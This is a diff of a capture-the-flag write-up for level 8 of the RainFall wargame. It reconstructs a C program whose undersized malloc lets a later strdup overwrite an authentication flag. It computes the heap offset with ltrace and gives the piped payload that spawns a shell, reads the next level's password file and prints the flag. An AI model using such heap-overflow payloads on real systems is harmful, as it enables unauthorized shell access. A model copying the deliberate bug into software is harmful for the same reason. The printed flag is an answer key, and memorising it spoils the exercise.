@@ -1,67 +1,123 @@
-# Analysis of the Binary
+# Level 8
 
-We've successfully extracted the source code from the binary. Here's an analysis of the key functionalities:
+## Answer
+Our C source code generates the same assembly code as the original binary. Compile it as follows:
+```
+gcc -fno-stack-protector source.c
+```
 
-## Key Observations
-- Multiple commands can be executed in any order.
-- The `login` command checks a user structure for authentication status. If authenticated, it grants shell access.
-- `auth` allocates memory for the user structure.
-- `service` is a command with a `strdup` call, vulnerable to buffer overflow.
+Let's take a look at the source code:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
-# Exploit Strategy
+struct s_user {
+    int id;
+    char login[28];
+    int is_auth;
+};
 
-Observing that the user structure is allocated on the heap and the `service` command is susceptible to a buffer overflow, we can manipulate this to overwrite the user structure. This would trick the `login` command into granting us shell access.
+int *service;
+struct s_user *user;
 
-## Steps for Exploitation
+int main()
+{
+    while (1)
+    {
+        printf("%p, %p \n", user, service);
+
+        char buf[128];
+
+        if (!(fgets(buf, 128, stdin)))
+            break;
+
+        if (!(strncmp(buf, "auth ", 5)))
+        {
+            user = malloc(4);
+            user->id = 0;
+
+            if (strlen(buf + 5) <= 30)
+                strcpy(user, buf + 5);
+        }
+
+        if (!(strncmp(buf, "reset", 5)))
+            free(user);
+
+        if (!(strncmp(buf, "service", 6)))
+            service = strdup(buf + 7);
+
+        if (!(strncmp(buf, "login", 5)))
+        {
+            if (user->is_auth)
+                system("/bin/sh");
+            else
+                fwrite("Password:\n", 1, 10, stdout);
+        }
+    }
+    return 0;
+}
+```
+
+Let's focus on the `main` function. It reads input using the `fgets` function, which is known to be safe due to its mechanism to limit the number of bytes read. Different commands are then executed based on the input:
+- `auth`: Allocates a user structure and copies the input into it.
+- `reset`: Frees the user structure.
+- `service`: Copies the input into the service buffer.
+- `login`: Checks if the user is authenticated and, if so, grants shell access.
+
+We notice that the `auth` doesn't allocate enough memory for the user structure, which is 36 bytes long (4 bytes for the id, 28 bytes for the login and 4 bytes for the `is_auth` field). This means that, with the `service` command, we can write to the user structure, since it will be allocated within the same memory space, and overwrite the `is_auth` field to gain shell access.
+
+Here's the following steps to perform the exploit:
 1. Use `auth` to allocate the user structure.
-2. Use `service` to overflow the structure.
+2. Use `service` to write in the user structure and overwrite `is_auth`
 3. Execute `login` to verify authentication and obtain a shell.
 
-## Calculating the Offset
-
-Using `ltrace`, we can track the `malloc` and `strdup` calls to determine the offset between the user structure and the buffer:
-
+We'll use `ltrace` to understand the memory allocations and calculate the size needed to overwrite `is_auth`:
 ```bash
 $ ltrace ./level8
-__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
-printf("%p, %p \n", (nil), (nil)(nil), (nil)
-)                                                               = 14
+[...]
 fgets(auth
-"auth \n", 128, 0xb7fd1ac0)                                                               = 0xbffff6d0
-malloc(4)                                                                                       = 0x0804a008
-strcpy(0x0804a008, "\n")                                                                        = 0x0804a008
-printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
-)                                                           = 18
+"auth \n", 128, 0xb7fd1ac0) = 0xbffff6d0
+malloc(4) = 0x0804a008
+strcpy(0x0804a008, "\n") = 0x0804a008 # user
+[...]
 fgets(service
-"service\n", 128, 0xb7fd1ac0)                                                             = 0xbffff6d0
-strdup("\n")                                                                                    = 0x0804a018
+"service\n", 128, 0xb7fd1ac0) = 0xbffff6d0
+strdup("\n") = 0x0804a018 # service
 [...]
 level8@RainFall:~$
 ```
 
-- The `malloc` call for the user structure returns `0x0804a008`.
-- The `strdup` call returns `0x0804a018`.
-- The distance between these addresses is `0x10` (16 bytes).
-- Considering the user structure layout, the `is_auth` field is 32 bytes from the start.
-- The required offset to overwrite `is_auth` is `32 - 16 = 16`.
+We notice that the the user structure is allocated at `0x0804a008` for only 4 bytes, which is not enough to store the whole structure that is 36 bytes long. We also notice that the service buffer is allocated at `0x0804a018` (so within the same memory space as the user structure, since it is located between `0x0804a008` and `0x0804a028`). Futhermore we notice that the `is_auth` field is located at the 32nd byte of the user structure.  
+So let's simply calculate the offset needed to reach `is_auth`:
+```
+0x0804a018 - 0x0804a008 = 0x10 (16 in decimal)
+32 - 16 = 16 bytes of padding
+```
 
-## Executing the Exploit
+We substract 32 from 16 because the `service` buffer was already allocated 16 bytes after the user structure. So we'll have to write 16 bytes of padding to reach `is_auth`. Anything written after that will overwrite `is_auth`.
 
-Here's the sequence of commands to perform the exploit:
+Let's craft our payload:
+```
+"auth "
+"service" + padding
+"login"
 
+"auth \n" + "service" + "A"*16 + "\n" + "login\n"
+```
+
+The `\n` are needed to simulate the user pressing the enter key and it will also serve as the 17th character needed to overwrite `is_auth`.
+
+Let's run our payload:
 ```bash
-$ (echo "auth "; python -c 'print("service" + "A"*16)'; echo "login"; cat) | ./level8
-```
-
-1. `auth `: Allocates the user structure.
-2. `python -c 'print("service" + "A"*16)'`: Overflows the buffer to overwrite `is_auth`.
-3. `login`: Checks if the user is authenticated and, due to the overflow, grants shell access.
-4. `cat`: Keeps the shell open to execute further commands.
-
-Result:
-
-```plaintext
+level7@RainFall:~$ (echo "auth "; python -c 'print("service" + "A"*16)'; echo "login"; cat) | ./level8
+(nil), (nil) 
+0x804a008, (nil) 
+0x804a008, 0x804a018 
+cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+0x804a008, 0x804a018
 ```
+> The `echo` commands and `print` python fucntion will both add a newline character at the end of the string.
 
-The exploit successfully manipulates the program's behavior to gain unauthorized access.
+We are now level9! Let's move on to the next level.
